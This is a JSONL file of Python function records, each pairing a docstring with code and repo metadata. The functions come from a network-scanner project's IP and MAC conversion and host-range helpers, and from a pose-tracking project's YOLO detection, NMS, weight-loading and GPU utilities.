{"docstring": "'''\nconvert ip address from decimal format to dotted-quad format\n'''\n", "func_signal": "def dec2dot(dec):\n", "code": "if dec>0xFFFFFFFF:\n    dec = 0xFFFFFFFF\nip = pack('!L', dec)\nreturn inet_ntoa(ip)", "path": "latest\\convert.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\nconvert ip address from dotted-quad format to decimal format\n'''\n", "func_signal": "def dot2dec(dot):\n", "code": "ip = inet_aton(dot)\nreturn unpack('!L', ip)[0]", "path": "stable\\convert.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n\tSplit host range into n parts (multithreaded)\n'''\n", "func_signal": "def split(self, hosts, n):\n", "code": "nhosts = hosts[1] - hosts[0] # number of hosts\nnparts = nhosts/n + 1\nhost_parts = []\nstart = hosts[0]\nwhile True:\n\tif len(host_parts)<n-1:\n\t\tend = start + nparts\n\t\thost_parts.append((start, end))\n\t\tstart = end\n\telse:\n\t\thost_parts.append((start, hosts[1]))\n\t\tbreak\nreturn host_parts", "path": "latest\\probe.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''handle arguments\nParameters:\n    args    -- arguments\nreturns:\n    command -- command (scan, ping, trace)\n    hosts   -- hosts ('192.168.24.7', '10.0.0.0/8')\n'''\n", "func_signal": "def Args(args):\n", "code": "command = 'scan'\nhosts = ''\nif len(args)==2:\n    command = args[0]\n    hosts = args[1]\nelif len(args)==1:\n    hosts = args[0]\nelse:\n    raise SyntaxError('nscan.py ping example.com')  \nreturn hosts, command", "path": "stable\\get.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n    Convert MAC address to byte\n'''\n", "func_signal": "def mac2byte(addr):\n", "code": "mac = []\nbyte = ''\nif ':' in addr:\n    mac = addr.split(':')\nelif '-' in addr:\n    mac = addr.split('-')\nelse:\n    raise ValueError('error: MAC address not valid')\nfor m in mac:\n    byte += chr(int(m, 16))\nreturn byte", "path": "latest\\convert.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "''' check if thread is alive '''\n", "func_signal": "def Alive(thread_list):\n", "code": "alive = False\nfor t in thread_list:\n\tif t.isAlive():\n\t\talive = True\n\t\tbreak\nreturn alive", "path": "latest\\probe.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\nconvert ip address from dotted-quad format to decimal format\n'''\n", "func_signal": "def dot2dec(dot):\n", "code": "ip = inet_aton(dot)\nreturn unpack('!L', ip)[0]", "path": "latest\\convert.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n\tSplit host range into n parts (multithreaded)\n'''\n", "func_signal": "def split(self, hosts, n):\n", "code": "nhosts = hosts[1] - hosts[0] # number of hosts\nnparts = nhosts/n + 1\nhost_parts = []\nstart = hosts[0]\nwhile True:\n\tif len(host_parts)<n-1:\n\t\tend = start + nparts\n\t\thost_parts.append((start, end))\n\t\tstart = end\n\telse:\n\t\thost_parts.append((start, hosts[1]))\n\t\tbreak\nreturn host_parts", "path": "stable\\probe.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n    Delete nscan alias interface\n'''\n", "func_signal": "def unload(self):\n", "code": "interfaces = open('/etc/network/interfaces', 'r')\ncontent = interfaces.read()\ninterfaces.close()\nalias = self.conf.format(self.ifname, '.+?')\nwhile True:\n    entry = re.search(alias, content)\n    if entry:\n        content = content.replace(entry.group(0), '')\n    else:\n        break\ninterfaces = open('/etc/network/interfaces', 'w')\ninterfaces.write(content)\ninterfaces.close()\nos.system('service networking restart')", "path": "latest\\startup.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\ninput:\n    host_list   -- hosts to scan ('10.0.0.0/8','10.0.0.0-10.255.255.255','192.168.1.23')\noutput:\n    hosts range -- start and end ip address (['10.0.0.0','10.255.255.255'])\n'''\n", "func_signal": "def Hosts(host_list):\n", "code": "hosts = []\nif '/' in host_list:\n    start, cidr = host_list.split('/')\n    start = dot2dec(start) # start is the first ip address\n    cidr = int(cidr)\n    mask = int('1'*cidr + '0'*(32-cidr), 2)\n    network_field = start & mask # fixed part\n    host_field = 0xffffffff ^ mask  # variable part\n    end = network_field | host_field # end is the last ip address\n    hosts = [start, end+1]\nelif '-' in host_list:\n    start, end = host_list.split('-')\n    hosts = [dot2dec(start), dot2dec(end)+1]\nelse:\n    hosts = [dot2dec(host_list), dot2dec(host_list)+1]\nreturn hosts", "path": "stable\\get.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n    Convert byte mac address to XX:XX:XX:XX:XX:XX\n'''\n", "func_signal": "def byte2mac(addr):\n", "code": "mac = ''\nfor b in addr:\n    byte =  hex(ord(b))    # '0xXX', '0xX'\n    byte = byte.replace('x', '')\n    \n    if len(byte)>2:\n        mac += byte[1:] + ':'\n    else:\n        mac += byte + ':'\nreturn mac.strip(':')", "path": "stable\\convert.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "''' check if thread is alive '''\n", "func_signal": "def Alive(thread_list):\n", "code": "alive = False\ni = 0\nwhile True:\n\talive = thread_list[i].isAlive()\n\ti += 1\n\tif alive or i==len(thread_list):\n\t\tbreak\nreturn alive", "path": "latest\\nscan.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "'''\n    Convert MAC address to byte\n'''\n", "func_signal": "def mac2byte(addr):\n", "code": "mac = []\nbyte = ''\nif ':' in addr:\n    mac = addr.split(':')\nelif '-' in addr:\n    mac = addr.split('-')\nelse:\n    raise ValueError('error: MAC address not valid')\nfor m in mac:\n    byte += chr(int(m, 16))\nreturn byte", "path": "stable\\convert.py", "repo_name": "OffensivePython/Nscan", "stars": 523, "license": "apache-2.0", "language": "python", "size": 489}
{"docstring": "\"\"\"\n    set visible gpu.\n\n    can be a single id, or a list\n\n    return a list of new gpus ids\n\"\"\"\n", "func_signal": "def visible_gpu(gpus):\n", "code": "gpus = [gpus] if isinstance(gpus, int) else list(gpus)\nos.environ['CUDA_VISIBLE_DEVICES'] = ','.join(list(map(str, gpus)))\nreturn list(range(len(gpus)))", "path": "graph\\torchlight\\torchlight\\gpu.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\" Compute true positives, predicted scores and predicted labels per sample \"\"\"\n", "func_signal": "def get_batch_statistics(outputs, targets, iou_threshold):\n", "code": "batch_metrics = []\nfor sample_i in range(len(outputs)):\n    annotations = targets[sample_i][targets[sample_i][:, -1] > 0].detach().cpu().numpy()\n    target_labels = annotations[:, 0] if len(annotations) else []\n\n    if outputs[sample_i] is None:\n        continue\n\n    output = outputs[sample_i].detach().cpu().numpy()\n    pred_boxes = output[:, :4]\n    pred_scores = output[:, 4]\n    pred_labels = output[:, -1]\n\n    true_positives = np.zeros(pred_boxes.shape[0])\n    if len(annotations):\n        detected_boxes = []\n        target_boxes = annotations[:, 1:]\n\n        for pred_i, (pred_box, pred_label) in enumerate(zip(pred_boxes, pred_labels)):\n\n            # If targets are found break\n            if len(detected_boxes) == len(annotations):\n                break\n\n            # Ignore if label is not one of the target labels\n            if pred_label not in target_labels:\n                continue\n\n            ious = bbox_iou_numpy(np.expand_dims(pred_box, 0), target_boxes)\n            iou, box_index = ious.max(1), ious.argmax(1)\n            if iou >= iou_threshold and box_index not in detected_boxes:\n                true_positives[pred_i] = 1\n                detected_boxes += [box_index]\n    batch_metrics.append([true_positives, pred_scores, pred_labels])\nreturn batch_metrics", "path": "detector\\detector_utils.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "# crop heatmaps by 1/scale\n", "func_signal": "def get_central_heatmaps(heatmaps, ratio, norm_size):\n", "code": "st = int(norm_size * (1 - ratio)/2)\ned = int(norm_size * (1 + ratio)/2)\nheatmaps_cropped = [heatmap[st:ed, st:ed] for heatmap in heatmaps]\n\n# get the middle heatmaps of norm size\nheatmaps_output = []\nfor heatmap_cropped in heatmaps_cropped:\n    heatmap_central = cv2.resize(heatmap_cropped, (norm_size, norm_size))\n    heatmaps_output.append(heatmap_central)\n\nreturn heatmaps_output", "path": "utils\\utils_convert_heatmap.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"Parses and loads the weights stored in 'weights_path'\"\"\"\n\n# Open the weights file\n", "func_signal": "def load_darknet_weights(self, weights_path):\n", "code": "fp = open(weights_path, \"rb\")\nheader = np.fromfile(fp, dtype=np.int32, count=5)  # First five are header values\n\n# Needed to write header when saving weights\nself.header_info = header\n\nself.seen = header[3]\nweights = np.fromfile(fp, dtype=np.float32)  # The rest are weights\nfp.close()\n\nptr = 0\nfor i, (module_def, module) in enumerate(zip(self.module_defs, self.module_list)):\n    if module_def[\"type\"] == \"convolutional\":\n        conv_layer = module[0]\n        if module_def[\"batch_normalize\"]:\n            # Load BN bias, weights, running mean and running variance\n            bn_layer = module[1]\n            num_b = bn_layer.bias.numel()  # Number of biases\n            # Bias\n            bn_b = torch.from_numpy(weights[ptr : ptr + num_b]).view_as(bn_layer.bias)\n            bn_layer.bias.data.copy_(bn_b)\n            ptr += num_b\n            # Weight\n            bn_w = torch.from_numpy(weights[ptr : ptr + num_b]).view_as(bn_layer.weight)\n            bn_layer.weight.data.copy_(bn_w)\n            ptr += num_b\n            # Running Mean\n            bn_rm = torch.from_numpy(weights[ptr : ptr + num_b]).view_as(bn_layer.running_mean)\n            bn_layer.running_mean.data.copy_(bn_rm)\n            ptr += num_b\n            # Running Var\n            bn_rv = torch.from_numpy(weights[ptr : ptr + num_b]).view_as(bn_layer.running_var)\n            bn_layer.running_var.data.copy_(bn_rv)\n            ptr += num_b\n        else:\n            # Load conv. bias\n            num_b = conv_layer.bias.numel()\n            conv_b = torch.from_numpy(weights[ptr : ptr + num_b]).view_as(conv_layer.bias)\n            conv_layer.bias.data.copy_(conv_b)\n            ptr += num_b\n        # Load conv. weights\n        num_w = conv_layer.weight.numel()\n        conv_w = torch.from_numpy(weights[ptr : ptr + num_w]).view_as(conv_layer.weight)\n        conv_layer.weight.data.copy_(conv_w)\n        ptr += num_w", "path": "detector\\models.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\n    @:param path    - path of the new weights file\n    @:param cutoff  - save layers between 0 and cutoff (cutoff = -1 -> all are saved)\n\"\"\"\n", "func_signal": "def save_weights(self, path, cutoff=-1):\n", "code": "fp = open(path, \"wb\")\nself.header_info[3] = self.seen\nself.header_info.tofile(fp)\n\n# Iterate through layers\nfor i, (module_def, module) in enumerate(zip(self.module_defs[:cutoff], self.module_list[:cutoff])):\n    if module_def[\"type\"] == \"convolutional\":\n        conv_layer = module[0]\n        # If batch norm, load bn first\n        if module_def[\"batch_normalize\"]:\n            bn_layer = module[1]\n            bn_layer.bias.data.cpu().numpy().tofile(fp)\n            bn_layer.weight.data.cpu().numpy().tofile(fp)\n            bn_layer.running_mean.data.cpu().numpy().tofile(fp)\n            bn_layer.running_var.data.cpu().numpy().tofile(fp)\n        # Load conv bias\n        else:\n            conv_layer.bias.data.cpu().numpy().tofile(fp)\n        # Load conv weights\n        conv_layer.weight.data.cpu().numpy().tofile(fp)\n\nfp.close()", "path": "detector\\models.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\nConstructs module list of layer blocks from module configuration in module_defs\n\"\"\"\n", "func_signal": "def create_modules(module_defs):\n", "code": "hyperparams = module_defs.pop(0)\noutput_filters = [int(hyperparams[\"channels\"])]\nmodule_list = nn.ModuleList()\nfor i, module_def in enumerate(module_defs):\n    modules = nn.Sequential()\n\n    if module_def[\"type\"] == \"convolutional\":\n        bn = int(module_def[\"batch_normalize\"])\n        filters = int(module_def[\"filters\"])\n        kernel_size = int(module_def[\"size\"])\n        pad = (kernel_size - 1) // 2 if int(module_def[\"pad\"]) else 0\n        modules.add_module(\n            \"conv_%d\" % i,\n            nn.Conv2d(\n                in_channels=output_filters[-1],\n                out_channels=filters,\n                kernel_size=kernel_size,\n                stride=int(module_def[\"stride\"]),\n                padding=pad,\n                bias=not bn,\n            ),\n        )\n        if bn:\n            modules.add_module(\"batch_norm_%d\" % i, nn.BatchNorm2d(filters))\n        if module_def[\"activation\"] == \"leaky\":\n            modules.add_module(\"leaky_%d\" % i, nn.LeakyReLU(0.1))\n\n    elif module_def[\"type\"] == \"maxpool\":\n        kernel_size = int(module_def[\"size\"])\n        stride = int(module_def[\"stride\"])\n        if kernel_size == 2 and stride == 1:\n            padding = nn.ZeroPad2d((0, 1, 0, 1))\n            modules.add_module(\"_debug_padding_%d\" % i, padding)\n        maxpool = nn.MaxPool2d(\n            kernel_size=int(module_def[\"size\"]),\n            stride=int(module_def[\"stride\"]),\n            padding=int((kernel_size - 1) // 2),\n        )\n        modules.add_module(\"maxpool_%d\" % i, maxpool)\n\n    elif module_def[\"type\"] == \"upsample\":\n        upsample = Upsample(scale_factor=int(module_def[\"stride\"]), mode=\"nearest\")\n        modules.add_module(\"upsample_%d\" % i, upsample)\n\n    elif module_def[\"type\"] == \"route\":\n        layers = [int(x) for x in module_def[\"layers\"].split(\",\")]\n        filters = sum([output_filters[layer_i] for layer_i in layers])\n        modules.add_module(\"route_%d\" % i, EmptyLayer())\n\n    elif module_def[\"type\"] == \"shortcut\":\n        filters = output_filters[int(module_def[\"from\"])]\n        modules.add_module(\"shortcut_%d\" % i, EmptyLayer())\n\n    elif module_def[\"type\"] == \"yolo\":\n        anchor_idxs = [int(x) for x in module_def[\"mask\"].split(\",\")]\n        # Extract anchors\n        anchors = [int(x) for x in module_def[\"anchors\"].split(\",\")]\n        anchors = [(anchors[i], anchors[i + 1]) for i in range(0, len(anchors), 2)]\n        anchors = [anchors[i] for i in anchor_idxs]\n        num_classes = int(module_def[\"classes\"])\n        img_height = int(hyperparams[\"height\"])\n        # Define detection layer\n        yolo_layer = YOLOLayer(anchors, num_classes, img_height)\n        modules.add_module(\"yolo_%d\" % i, yolo_layer)\n    # Register module list and number of output filters\n    module_list.append(modules)\n    output_filters.append(filters)\n\nreturn hyperparams, module_list", "path": "detector\\models.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "'''Arbitrary resampling of source array to new dimension sizes.\nCurrently only supports maintaining the same number of dimensions.\nTo use 1-D arrays, first promote them to shape (x,1).\n\nUses the same parameters and creates the same co-ordinate lookup points\nas IDL''s congrid routine, which apparently originally came from a VAX/VMS\nroutine of the same name.\n\nmethod:\nneighbour - closest value from original data\nnearest and linear - uses n x 1-D interpolations using\n                     scipy.interpolate.interp1d\n(see Numerical Recipes for validity of use of n 1-D interpolations)\nspline - uses ndimage.map_coordinates\n\ncentre:\nTrue - interpolation points are at the centres of the bins\nFalse - points are at the front edge of the bin\n\nminusone:\nFor example- inarray.shape = (i,j) & new dimensions = (x,y)\nFalse - inarray is resampled by factors of (i/x) * (j/y)\nTrue - inarray is resampled by(i-1)/(x-1) * (j-1)/(y-1)\nThis prevents extrapolation one element beyond bounds of input array.\n'''\n", "func_signal": "def congrid(a, newdims, method='linear', centre=False, minusone=False):\n", "code": "if not a.dtype in [n.float64, n.float32]:\n    a = n.cast[float](a)\n\nm1 = n.cast[int](minusone)\nofs = n.cast[int](centre) * 0.5\nold = n.array( a.shape )\nndims = len( a.shape )\nif len( newdims ) != ndims:\n    print(\"[congrid] dimensions error. \" \\\n          \"This routine currently only support \" \\\n          \"rebinning to the same number of dimensions.\")\n    return None\nnewdims = n.asarray( newdims, dtype=float )\ndimlist = []\n\nif method == 'neighbour':\n    for i in range( ndims ):\n        base = n.indices(newdims)[i]\n        dimlist.append( (old[i] - m1) / (newdims[i] - m1) \\\n                        * (base + ofs) - ofs )\n    cd = n.array( dimlist ).round().astype(int)\n    newa = a[list( cd )]\n    return newa\n\nelif method in ['nearest','linear']:\n    # calculate new dims\n    for i in range( ndims ):\n        base = n.arange( newdims[i] )\n        dimlist.append( (old[i] - m1) / (newdims[i] - m1) \\\n                        * (base + ofs) - ofs )\n    # specify old dims\n    olddims = [n.arange(i, dtype = n.float) for i in list( a.shape )]\n\n    # first interpolation - for ndims = any\n    mint = scipy.interpolate.interp1d( olddims[-1], a, kind=method )\n    newa = mint( dimlist[-1] )\n\n    trorder = [ndims - 1] + range( ndims - 1 )\n    for i in range( ndims - 2, -1, -1 ):\n        newa = newa.transpose( trorder )\n\n        mint = scipy.interpolate.interp1d( olddims[i], newa, kind=method )\n        newa = mint( dimlist[i] )\n\n    if ndims > 1:\n        # need one more transpose to return to original dimensions\n        newa = newa.transpose( trorder )\n\n    return newa\nelif method in ['spline']:\n    oslices = [ slice(0,j) for j in old ]\n    oldcoords = n.ogrid[oslices]\n    nslices = [ slice(0,j) for j in list(newdims) ]\n    newcoords = n.mgrid[nslices]\n\n    newcoords_dims = range(n.rank(newcoords))\n    #make first index last\n    newcoords_dims.append(newcoords_dims.pop(0))\n    newcoords_tr = newcoords.transpose(newcoords_dims)\n    # makes a view that affects newcoords\n\n    newcoords_tr += ofs\n\n    deltas = (n.asarray(old) - m1) / (newdims - m1)\n    newcoords_tr *= deltas\n\n    newcoords_tr -= ofs\n\n    newa = scipy.ndimage.map_coordinates(a, newcoords)\n    return newa\nelse:\n    print(\"Congrid error: Unrecognized interpolation type.\\n\", \\\n          \"Currently only \\'neighbour\\', \\'nearest\\',\\'linear\\',\", \\\n          \"and \\'spline\\' are supported.\")\n    return None", "path": "utils\\utils_convert_heatmap.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\nReturns the IoU of two bounding boxes\n\"\"\"\n", "func_signal": "def bbox_iou(box1, box2, x1y1x2y2=True):\n", "code": "if not x1y1x2y2:\n    # Transform from center and width to exact coordinates\n    b1_x1, b1_x2 = box1[:, 0] - box1[:, 2] / 2, box1[:, 0] + box1[:, 2] / 2\n    b1_y1, b1_y2 = box1[:, 1] - box1[:, 3] / 2, box1[:, 1] + box1[:, 3] / 2\n    b2_x1, b2_x2 = box2[:, 0] - box2[:, 2] / 2, box2[:, 0] + box2[:, 2] / 2\n    b2_y1, b2_y2 = box2[:, 1] - box2[:, 3] / 2, box2[:, 1] + box2[:, 3] / 2\nelse:\n    # Get the coordinates of bounding boxes\n    b1_x1, b1_y1, b1_x2, b1_y2 = box1[:, 0], box1[:, 1], box1[:, 2], box1[:, 3]\n    b2_x1, b2_y1, b2_x2, b2_y2 = box2[:, 0], box2[:, 1], box2[:, 2], box2[:, 3]\n\n# get the corrdinates of the intersection rectangle\ninter_rect_x1 = torch.max(b1_x1, b2_x1)\ninter_rect_y1 = torch.max(b1_y1, b2_y1)\ninter_rect_x2 = torch.min(b1_x2, b2_x2)\ninter_rect_y2 = torch.min(b1_y2, b2_y2)\n# Intersection area\ninter_area = torch.clamp(inter_rect_x2 - inter_rect_x1 + 1, min=0) * torch.clamp(\n    inter_rect_y2 - inter_rect_y1 + 1, min=0\n)\n# Union Area\nb1_area = (b1_x2 - b1_x1 + 1) * (b1_y2 - b1_y1 + 1)\nb2_area = (b2_x2 - b2_x1 + 1) * (b2_y2 - b2_y1 + 1)\n\niou = inter_area / (b1_area + b2_area - inter_area + 1e-16)\n\nreturn iou", "path": "detector\\detector_utils.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "# find the index of a dict in list\n", "func_signal": "def find(lst, key, value):\n", "code": "index_list = []\nfor i, dic in enumerate(lst):\n    if dic[key] == value:\n        index_list.append(i)\nreturn index_list", "path": "graph\\visualize_pose_matching_diff_persons.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\nRemoves detections with lower object confidence score than 'conf_thres' and performs\nNon-Maximum Suppression to further filter detections.\nReturns detections with shape:\n    (x1, y1, x2, y2, object_conf, class_score, class_pred)\n\"\"\"\n\n# From (center x, center y, width, height) to (x1, y1, x2, y2)\n", "func_signal": "def non_max_suppression(prediction, conf_thres=0.5, nms_thres=0.4):\n", "code": "prediction[..., :4] = xywh2xyxy(prediction[..., :4])\noutput = [None for _ in range(len(prediction))]\nfor image_i, image_pred in enumerate(prediction):\n    # Filter out confidence scores below threshold\n    image_pred = image_pred[image_pred[:, 4] >= conf_thres]\n    # If none are remaining => process next image\n    if not image_pred.size(0):\n        continue\n    # Object confidence times class confidence\n    score = image_pred[:, 4] * image_pred[:, 5:].max(1)[0]\n    # Sort by it\n    image_pred = image_pred[(-score).argsort()]\n    class_preds = image_pred[:, 5:].max(1, keepdim=True)[1].float()\n    detections = torch.cat((image_pred[:, :5], class_preds), 1)\n    # Perform non-maximum suppression\n    keep_boxes = []\n    while detections.size(0):\n        large_overlap = bbox_iou(detections[0, :4].unsqueeze(0), detections[:, :4]) > nms_thres\n        label_match = detections[0, -1] == detections[:, -1]\n        # Indices of boxes with lower confidence scores, large IOUs and matching labels\n        invalid = large_overlap & label_match\n        weights = detections[invalid, 4:5]\n        # Merge overlapping bboxes by order of confidence\n        detections[0, :4] = (weights * detections[invalid, :4]).sum(0) / weights.sum()\n        keep_boxes += [detections[0]]\n        detections = detections[~invalid]\n    if keep_boxes:\n        output[image_i] = torch.stack(keep_boxes)\n\nreturn output", "path": "detector\\detector_utils.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\nLoads class labels at 'path'\n\"\"\"\n", "func_signal": "def load_classes(path):\n", "code": "fp = open(path, \"r\")\nnames = fp.read().split(\"\\n\")[:-1]\nreturn names", "path": "detector\\detector_utils.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\" Compute the average precision, given the recall and precision curves.\nCode originally from https://github.com/rbgirshick/py-faster-rcnn.\n\n# Arguments\n    recall:    The recall curve (list).\n    precision: The precision curve (list).\n# Returns\n    The average precision as computed in py-faster-rcnn.\n\"\"\"\n# correct AP calculation\n# first append sentinel values at the end\n", "func_signal": "def compute_ap(recall, precision):\n", "code": "mrec = np.concatenate(([0.0], recall, [1.0]))\nmpre = np.concatenate(([0.0], precision, [0.0]))\n\n# compute the precision envelope\nfor i in range(mpre.size - 1, 0, -1):\n    mpre[i - 1] = np.maximum(mpre[i - 1], mpre[i])\n\n# to calculate area under PR curve, look for points\n# where X axis (recall) changes value\ni = np.where(mrec[1:] != mrec[:-1])[0]\n\n# and sum (\\Delta recall) * prec\nap = np.sum((mrec[i + 1] - mrec[i]) * mpre[i + 1])\nreturn ap", "path": "detector\\detector_utils.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\nReturn the boxes on image grid.\n\"\"\"\n\n# height and width of the heatmap\n", "func_signal": "def get_boxes_grid(image_height, image_width):\n", "code": "if cfg.NET_NAME == 'CaffeNet':\n  height = np.floor((image_height * max(cfg.TRAIN.SCALES) - 1) / 4.0 + 1)\n  height = np.floor((height - 1) / 2.0 + 1 + 0.5)\n  height = np.floor((height - 1) / 2.0 + 1 + 0.5)\n\n  width = np.floor((image_width * max(cfg.TRAIN.SCALES) - 1) / 4.0 + 1)\n  width = np.floor((width - 1) / 2.0 + 1 + 0.5)\n  width = np.floor((width - 1) / 2.0 + 1 + 0.5)\nelif cfg.NET_NAME == 'VGGnet':\n  height = np.floor(image_height * max(cfg.TRAIN.SCALES) / 2.0 + 0.5)\n  height = np.floor(height / 2.0 + 0.5)\n  height = np.floor(height / 2.0 + 0.5)\n  height = np.floor(height / 2.0 + 0.5)\n\n  width = np.floor(image_width * max(cfg.TRAIN.SCALES) / 2.0 + 0.5)\n  width = np.floor(width / 2.0 + 0.5)\n  width = np.floor(width / 2.0 + 0.5)\n  width = np.floor(width / 2.0 + 0.5)\nelse:\n  assert (1), 'The network architecture is not supported in utils.get_boxes_grid!'\n\n# compute the grid box centers\nh = np.arange(height)\nw = np.arange(width)\ny, x = np.meshgrid(h, w, indexing='ij')\ncenters = np.dstack((x, y))\ncenters = np.reshape(centers, (-1, 2))\nnum = centers.shape[0]\n\n# compute width and height of grid box\narea = cfg.TRAIN.KERNEL_SIZE * cfg.TRAIN.KERNEL_SIZE\naspect = cfg.TRAIN.ASPECTS  # height / width\nnum_aspect = len(aspect)\nwidths = np.zeros((1, num_aspect), dtype=np.float32)\nheights = np.zeros((1, num_aspect), dtype=np.float32)\nfor i in range(num_aspect):\n  widths[0, i] = math.sqrt(area / aspect[i])\n  heights[0, i] = widths[0, i] * aspect[i]\n\n# construct grid boxes\ncenters = np.repeat(centers, num_aspect, axis=0)\nwidths = np.tile(widths, num).transpose()\nheights = np.tile(heights, num).transpose()\n\nx1 = np.reshape(centers[:, 0], (-1, 1)) - widths * 0.5\nx2 = np.reshape(centers[:, 0], (-1, 1)) + widths * 0.5\ny1 = np.reshape(centers[:, 1], (-1, 1)) - heights * 0.5\ny2 = np.reshape(centers[:, 1], (-1, 1)) + heights * 0.5\n\nboxes_grid = np.hstack((x1, y1, x2, y2)) / cfg.TRAIN.SPATIAL_SCALE\n\nreturn boxes_grid, centers[:, 0], centers[:, 1]", "path": "lib\\utils\\boxes_grid.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\n    make program appear on nvidia-smi.\n\"\"\"\n", "func_signal": "def occupy_gpu(gpus=None):\n", "code": "if gpus is None:\n    torch.zeros(1).cuda()\nelse:\n    gpus = [gpus] if isinstance(gpus, int) else list(gpus)\n    for g in gpus:\n        torch.zeros(1).cuda(g)", "path": "graph\\torchlight\\torchlight\\gpu.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "#TODO(global variables ?? how about _adam weights)\n", "func_signal": "def load_model(sess, model_path):\n", "code": "variables = tf.global_variables()\nvar_keep_dic = get_variables_in_checkpoint_file(model_path)\nif 'global_step' in var_keep_dic:\n    var_keep_dic.pop('global_step')\n\n# vis_var_keep_dic = []\nvariables_to_restore = []\nfor v in variables:\n    if v.name.split(':')[0] in var_keep_dic:\n        # print('Varibles restored: %s' % v.name)\n        variables_to_restore.append(v)\n        # vis_var_keep_dic.append(v.name.split(':')[0])\n    else:\n        # print('Unrestored Variables: %s' % v.name)\n        pass\n# print('Extra Variables in ckpt', set(var_keep_dic) - set(vis_var_keep_dic))\n\nif len(variables_to_restore) > 0:\n    restorer = tf.train.Saver(variables_to_restore)\n    restorer.restore(sess, model_path)\nelse:\n    print('No variables in {} fits the network'.format(model_path))", "path": "lib\\tfflat\\saver.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "# change pose B so that pose A and pose B does not match\n", "func_signal": "def change_pose_graph(self, data_numpy):\n", "code": "pose = np.zeros((15, 2))\npose[:, 0] = data_numpy[0, 0, :, 0]\npose[:, 1] = data_numpy[1, 0, :, 0]\n\nfor joint_id in range(15):\n    offset_x = random.uniform(-0.2, 0.2)\n    offset_y = random.uniform(-0.2, 0.2)\n\n    pose[joint_id, 0] += offset_x\n    pose[joint_id, 1] += offset_y\n\n    for dim in range(2):\n        pose[joint_id, dim] = min(pose[joint_id, dim], 1)\n        pose[joint_id, dim] = max(pose[joint_id, dim], 0)\n\ndata_numpy[0, 0, :, 0] = pose[:, 0]\ndata_numpy[1, 0, :, 0] = pose[:, 1]\nreturn", "path": "graph\\gcn_utils\\feeder_random_negative.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\"\n    count how many gpus used.\n\"\"\"\n", "func_signal": "def ngpu(gpus):\n", "code": "gpus = [gpus] if isinstance(gpus, int) else list(gpus)\nreturn len(gpus)", "path": "graph\\torchlight\\torchlight\\gpu.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "\"\"\" inputs: list of (x0, y0, x1, y1, score)\"\"\"\n", "func_signal": "def execute(self, inputs, outputs):\n", "code": "in_ = inputs[0].get_value()\nkeep = gpu_nms(in_, thresh=self._iou_threshold)\noutputs[0].set_value(keep)", "path": "lib\\lib_kernel\\lib_nms\\nms_opr.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
{"docstring": "# move modules to gpu\n", "func_signal": "def gpu(self):\n", "code": "self.model = self.model.to(self.dev)\nfor name, value in vars(self).items():\n    cls_name = str(value.__class__)\n    if cls_name.find('torch.nn.modules') != -1:\n        setattr(self, name, value.to(self.dev))\n\n# model parallel\nif self.arg.use_gpu and len(self.gpus) > 1:\n    self.model = nn.DataParallel(self.model, device_ids=self.gpus)", "path": "graph\\gcn_utils\\io.py", "repo_name": "Guanghan/lighttrack", "stars": 700, "license": "mit", "language": "python", "size": 69233}
